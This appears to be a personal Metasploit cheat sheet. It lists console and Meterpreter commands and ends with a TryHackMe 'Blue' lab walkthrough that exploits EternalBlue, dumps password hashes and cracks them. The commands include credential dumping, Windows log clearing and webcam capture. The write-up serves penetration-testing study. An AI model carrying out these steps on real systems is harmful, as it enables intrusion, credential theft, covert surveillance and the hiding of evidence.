# Setup Database
* To initialize the database: `msfdb init`

# Commands

## General
* Help menu: `?`
* Connect to a host (similar to netcat or telnet): `connect`
* To view information about a module: `info`
* Save the current settings / active datastores to a file: `save`
* Search for a module: `search`
* To select a module `use`
	* Right after searching a module, you can use `use <number>` to use a module number

## Modules
* Load a module (framework plugin): `load <plugin>`

## Variables
* To set a variable: `set <var>`
* To set a global variable: `setg <var>`
* To get a variable: `get <var>`
* To reset a variable to null / no value: `unset <var>`

## Micelaneous
* Screen cast (save the contents of the screen to a file): `spool`

# Modules
* There are seven modules types

## Auxiliary
* Scanning and verifying machines are exploitable

## Encoder
* Payload obfuscation
* Allows use to modify the "appearance" of the exploit to avoid signature detection

## Exploit
* Holds exploit code

### Commands
* To mount and exploit: `use <exploit>`
* To search for an exploit: `search <key words>`
* To set a payload: `set PAYLOAD <payload>`
	* If no payload is set, a metasploit reverse shell is usually the default
* To run the job in the background: `run -j`
* To view running jobs: `jobs`
* To view active sessions (connections): `sessions`
	* To join a session: `sessions -i <session number>`

## Evasion
* New to Metasploit 5

## NOP
* Used with buffer overflow and ROP attacks

## Payload
* Contains shellcode to execute the exploit

## Post
* Loot and pivot!

### [Meterpriter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

#### [Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
* Access the help menu: `?`
* Background the session: `background`
* Cat: `cat <file>`
* Change directory: `cd <dir>`
    * Show the current path: `pwd`
* Clear the application, system, and security logs on a Windows system: `clearev`
* Download file from the remote machine: `download <file>`
* Edit a file: `edit <file>`
* Execute a command on the target: `execute <command>`
* Get the current user id: `getuid`
* Dump hashes from the SAM database: `run post/windows/gather/hashdump`
* Display idle time of the remote user: `idletime`
* Display ip address information: `ipconfig`
* Change local working directory: `lcd <dir>`
    * View the local working path: `lpwd`
* View files in current remote directory: `ls`
* Migrate from one process to another on the victim: `run post/windows/manage/migrate`
* View the running processes: `ps`
* Run commands from a meterpriter script: `resource <path to commands file> <where to run commands on target>`
* Find specific files on the target host: `search <thing>`
* Enter shell: `shell`
* Upload a file to the target: `upload <local file> <target path>`
* Display available webcams on target: `webcam_list`
* Save a snapshot from the target's webcam: `webcam_snap`


# Recon

## Nmap
* Metasploit has a built in way for nmap to run and save the results directory to the database: `db_nmap`
* To view saved hosts: `hosts`
* To view the found services: `services`
* To view list of known vulnerabilities found: `vulns`
	* To generate: `db_nmap --script vuln <IP>`

# Examples

## TryHackMe

### Blue
* Scan machine for vulnerabilities: `db_nmap --script vuln <IP>`
	* Possible exploit: `ms17-010`
* Search: `search ms17-010`
* Use "ms17_010_eternalblue"
* Set RHOSTS
* `run -j`
* Confirm session was created: `sessions`
	* This vulnerability is finicky and often fails
* Connect to session: `sessions -i <id>`
* Esculate privaleges
* Use: "post/multi/manage/shell_to_meterpreter" to convert a normal shell to a meterpreter shell
* Connect to session
* List processes via meterpreter: `ps`
* Migrate to a "NT AUTHORITY\SYSTEM" process: `migrate <PID>`
* Get some passwords: `hashdump`
* Use john the ripper: `john pwlist.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt`
* Find some flags! Easy way: `search flag1`
